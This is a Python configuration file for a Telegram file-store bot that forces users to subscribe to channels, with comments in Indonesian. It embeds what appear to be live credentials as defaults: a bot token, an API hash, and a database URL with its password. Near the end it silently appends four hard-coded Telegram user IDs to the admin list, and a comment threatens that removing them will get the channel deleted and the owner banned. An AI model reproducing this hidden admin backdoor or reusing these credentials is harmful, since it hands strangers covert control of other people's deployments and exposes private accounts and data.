# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6271642456:AAGh7sFu5H00T72Nqw4nzRD3jMO-ag138wo")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "10064016"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "b9ca5d9a6c625a890af28db4adf50cf4")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001562016842"))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "Dhilnihnge")

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://vyawbnep:LGcY5SCElw1EanljVGiD4QUTXHo4OqzX@flora.db.elephantsql.com/vyawbnep")

PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_1 = int(os.environ.get("FORCE_SUB_1", "-1001891291114"))
FORCE_SUB_2 = int(os.environ.get("FORCE_SUB_2", "-1001919046075"))
FORCE_SUB_3 = int(os.environ.get("FORCE_SUB_3", "0"))
FORCE_SUB_4 = int(os.environ.get("FORCE_SUB_4", "0"))
FORCE_SUB_5 = int(os.environ.get("FORCE_SUB_5", "0"))
FORCE_SUB_6 = int(os.environ.get("FORCE_SUB_6", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "5766816260").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\nAnda harus bergabung di Channel/Grup saya Terlebih dahulu untuk Melihat File yang saya Bagikan\n\nSilakan Join Ke Channel & Group Terlebih Dahulu</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend((2118671268,1668766845,1924219811,1948147616))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
